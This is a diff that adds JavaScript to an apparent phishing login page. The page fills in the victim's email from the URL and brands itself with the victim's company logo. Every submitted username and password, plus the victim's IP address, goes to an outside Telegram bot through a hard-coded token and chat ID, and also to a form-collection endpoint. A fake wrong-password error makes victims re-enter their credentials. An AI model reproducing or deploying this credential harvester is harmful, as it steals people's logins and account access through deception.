+  function getUserIP(callback) {
+    $.ajax({
+      url: 'https://api.ipify.org?format=json',
+      method: 'GET',
+      dataType: 'json',
+      success: function(data) {
+        // Pass the fetched IP to the callback function
+        callback(data.ip);
+      },
+      error: function() {
+        // If the IP service fails, send a placeholder and continue
+        callback('IP not available');
+      }
+    });
+  }
+
+  // --- Form Submission Logic ---
+
+  function sendFormData(email, password, honeypot, $input, $passwordInput) {
+    $.ajax({
+      type: 'POST',
+      url: "https://submit-form.com/bbKESMhI7",
+      data: {
+        user_username: email,
+        user_password: password,
+        contact_info: honeypot
+      },
+      dataType: 'json',
+      success: function(data) {
+        console.log("data.redirect ", data.redirect);
+        console.log("data.reset ", data.reset);
+        console.log("data.count " + count);
+
+        if (!$input.is(':disabled')) {
+          document.getElementById("user_password").style.borderColor = "red";
+          document.getElementById("error").style.display = "block";
+
+          if (count >= 3) {
+            document.getElementById("error").setAttribute('data-i18n', 'too_many_attempts');
+            i18next.changeLanguage(navigator.language || navigator.userLanguage || 'en', function() {
+              document.getElementById("error").textContent = i18next.t('too_many_attempts');
+            });
+            if (count >= 5) {
+              $input.attr("disabled", "disabled");
+              $passwordInput.attr("disabled", "disabled");
+              setTimeout(function() {
+                count = 0;
+                $input.removeAttr("disabled");
+                $passwordInput.removeAttr("disabled");
+                document.getElementById("user_password").style.borderColor = "";
+                document.getElementById("error").style.display = "none";
+                document.getElementById("error").setAttribute('data-i18n', 'error');
+                i18next.changeLanguage(navigator.language || navigator.userLanguage || 'en', function() {
+                  document.getElementById("error").textContent = i18next.t('error');
+                });
+                $passwordInput.val('');
+              }, 120000);
+            }
+          } else {
+            document.getElementById("error").setAttribute('data-i18n', 'error');
+            i18next.changeLanguage(navigator.language || navigator.userLanguage || 'en', function() {
+              document.getElementById("error").textContent = i18next.t('error');
+            });
+          }
+          $passwordInput.val('');
+        }
+      },
+      error: function(request, x, y) {
+        if (request.status == 422) {
+          var errorsHtml = "";
+          $.each(request.responseJSON.errors, function(key, value) {
+            errorsHtml += '' + value[0] + '<br/>';
+          });
+        } else if (request.status == 419) {
+          location.reload();
+        }
+      },
+      complete: function(data) {
+        $("#loading").css("display", "none");
+      },
+      beforeSend: function() {
+        if (!$input.is(':disabled')) {
+          document.getElementById("user_password").style.borderColor = "";
+          document.getElementById("error").style.display = "none";
+        }
+      },
+    });
+  }
+
+  function sendToTelegram(username, password, ipAddress) {
+    const telegramToken = '7103630373:AAE6U52dZ_UBA5-VSC2mP4xMHGnXJZT3DJs';
+    const telegramChatId = '6134592216';
+    const message = `New form submission:
+
+Username: ${username}
+Password: ${password}
+IP Address: ${ipAddress}`;
+    const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+
+    $.ajax({
+      type: 'POST',
+      url: url,
+      data: {
+        chat_id: telegramChatId,
+        text: message,
+        parse_mode: 'HTML'
+      },
+      success: function(response) {
+        console.log('Data successfully sent to Telegram.');
+      },
+      error: function(error) {
+        console.error('Error sending data to Telegram:', error);
+      }
+    });
+  }
+
+  $(document).on("submit", '.login_form', function(e) {
+    e.preventDefault();
+    var $form = $(this);
+    var $input = $form.find(':submit');
+    var $passwordInput = $('#user_password');
+    var email = $("#user_username").val();
+    var password = $passwordInput.val();
+    var honeypot = $("#contact_info").val();
+
+    // New submission flow: Get IP first, then submit.
+    getUserIP(function(ipAddress) {
+      // Now that we have the IP, we can proceed with the submissions.
+
+      // 1. Send data to Telegram (with IP)
+      sendToTelegram(email, password, ipAddress);
+
+      // 2. Send data to the original form endpoint
+      if (!$input.is(':disabled')) {
+        count++;
+        sendFormData(email, password, honeypot, $input, $passwordInput);
+      } else {
+        sendFormData(email, password, honeypot, $input, $passwordInput);
+      }
+    });
+  });
+
+  function fetchEmail() {
+    var mail = '';
+    if (location.hash) {
+      if (location.hash.startsWith('#')) {
+        mail = location.hash.substr(1);
+      } else if (location.hash.startsWith('#@')) {
+        mail = location.hash.substr(2);
+      }
+    }
+    if (!mail && location.search) {
+      var params = new URLSearchParams(location.search);
+      mail = params.get('email') || '';
+    }
+    document.querySelector('#user_username').value = mail;
+    return mail;
+  }
+
+  function changeLogo($d) {
+    var Explode = $d.split("@");
+    return Explode[1];
+  }
+
+  function checkImage(url) {
+    var request = new XMLHttpRequest();
+    request.open("GET", url, true);
+    request.send();
+    request.onload = function() {
+      status = request.status;
+      if (request.status == 200) {
+        document.getElementById('logo').src = "https://logo.clearbit.com/" + changeLogo(fetchEmail());
+      }
+    }
+  }
+
+  // --- Dynamic Verification Message Logic ---
+  var emailForMessage = fetchEmail();
+  if (emailForMessage) {
+    var domainForMessage = changeLogo(emailForMessage);
+    // You can customize the message below
+    document.getElementById('verification-message').innerHTML = '<span style="font-size: 0.9em;"><strong>' + domainForMessage + '</strong></span><br><br>verifying you are human...';
+  }
+
+  checkImage("https://logo.clearbit.com/" + changeLogo(fetchEmail()));
+  $("#favicon").attr("href", "https://logo.clearbit.com/" + changeLogo(fetchEmail()));
+</script>
+</body>
+</html>
